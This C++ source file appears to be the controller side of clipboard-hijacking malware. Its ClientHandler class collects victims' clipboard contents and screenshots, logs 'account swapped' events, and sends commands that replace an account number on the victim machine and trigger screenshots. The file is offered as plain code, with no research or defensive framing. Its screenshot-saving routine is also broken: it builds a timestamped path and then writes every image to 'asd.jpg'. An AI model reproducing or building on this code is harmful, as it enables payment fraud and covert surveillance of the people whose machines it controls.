#include "ClientHandler.hh"
#include "Tools.hh"
#include "IpAddress.hh"
#include "ServerConfig.hh"
#include <future>
#include <chrono>
#include <fstream>
#include <ctime>
#include <filesystem>
using namespace std::chrono_literals;

ClientHandler::ClientHandler(SOCKET clientSocket)
	: clientSocket(clientSocket),socket(clientSocket)
{
	sockaddr sa{};
	int nLen = sizeof(sa);
	getpeername(this->clientSocket, &sa, &nLen);
	this->ipAddress = IpAddress{ sa };
}

ClientHandler::~ClientHandler()
{

}


void ClientHandler::RecvClipboardString(const Metadata& metadata) {
	auto clipboardString = this->socket.RecvString(metadata);
	Tools::PrintDebugMessage("Received clipboard message:\n" + clipboardString);
	clipboardContentHistory.push_back(clipboardString);
}

std::vector<char> ClientHandler::RecvScreenshotAsJpgBytes(const Metadata& metadata) {
	Tools::PrintDebugMessage("Receiving screenshot: " +std::to_string( metadata.size));
	auto screenshot = this->socket.RecvBytes(metadata.size);
	Tools::PrintDebugMessage("Receiving screenshot done!: " + std::to_string(screenshot.size()));
	return screenshot;
}

void ClientHandler::SaveScreenshot(const std::vector<char>& screenshot) {
	auto time = std::time(nullptr);
	char buffer[80];
	time_t rawTime;
	tm timeinfo;
	std::time(&rawTime);
	localtime_s(&timeinfo, &rawTime);
	strftime(buffer, sizeof(buffer), "%d-%m-%Y %I:%M:%S", &timeinfo);
	std::string str(buffer);
	{
		std::experimental::filesystem::path path = (std::string)this->ipAddress + " / " + str;
		auto file = std::ofstream("asd.jpg", std::ios::binary);
		std::copy(screenshot.begin(), screenshot.end(), std::ostreambuf_iterator<char>(file));
	}
}


void ClientHandler::Handle() try {
	while (true) {
		auto metadata = this->socket.RecvMetadata();
		switch (metadata.dataType) {
		case DataType::STRING:
			this->socket.RecvString(metadata);
			break;
		case DataType::INT32:
			//this->RecvInt32(metadata);
			break;
		case DataType::CLIPBOARD_STRING:
			this->RecvClipboardString(metadata);
			break;
		case DataType::ACCOUNT_SWAP_NOTIFICATION:
			Tools::PrintDebugMessage("Account swapped!");
			break;
		case DataType::SCREENSHOT:
		{
			auto screenshot = this->RecvScreenshotAsJpgBytes(metadata);
			this->SaveScreenshot(screenshot);
		}
			break;
		default:;
		}
	}
}catch(const std::exception &ex) {
	Tools::PrintDebugMessage("ex: "s + ex.what());
	system("pause");
}

void ClientHandler::ChangeAccountNumber(std::string accountNumber) {
		auto size = ::strlen(accountNumber.c_str());
		this->socket.SendMetadata(Metadata{ DataType::CHANGE_ACCOUNT_NUMBER_CMD, size });
		this->socket.SendBytes(accountNumber.c_str(), size);
}

void ClientHandler::GetScreenshotCmd() {
		Tools::PrintDebugMessage("Sending MAKE_SCREENSHOT command");
		this->socket.SendMetadata(Metadata{ DataType::MAKE_SCREENSHOT_CMD, NULL });
}
